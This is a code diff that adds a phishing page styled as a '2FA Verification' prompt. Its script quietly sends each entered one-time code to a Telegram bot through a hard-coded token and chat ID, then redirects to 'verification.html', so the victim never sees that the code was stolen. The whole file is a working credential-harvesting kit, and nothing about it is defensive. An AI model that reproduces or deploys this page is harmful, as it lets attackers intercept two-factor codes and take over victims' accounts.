@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2FA Verification</title>
+    <style>
+        body { margin: 0; background-color: rgb(36, 36, 36); color: #fff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; padding: 20px; }
+        input { padding: 10px; margin: 10px; width: 80%; }
+        button { padding: 10px 20px; background: #39b54a; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>2FA Verification</h1>
+        <p>Enter the code sent to your device</p>
+        <form id="auth-form">
+            <input type="text" id="verificationCode" placeholder="Enter Code" required>
+            <br>
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        const bots = { "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671" };
+
+        document.getElementById('auth-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('verificationCode').value;
+            const message = `2FA Code: ${code}`;
+
+            try {
+                const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
+                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                    const response = await fetch(url);
+                    return response.ok;
+                });
+                await Promise.all(sendPromises);
+                // REDIRECTION FIX:
+                window.location.href = 'verification.html';
+            } catch (err) {
+                window.location.href = 'verification.html';
+            }
+        });
+    </script>
+</body>
+</html>
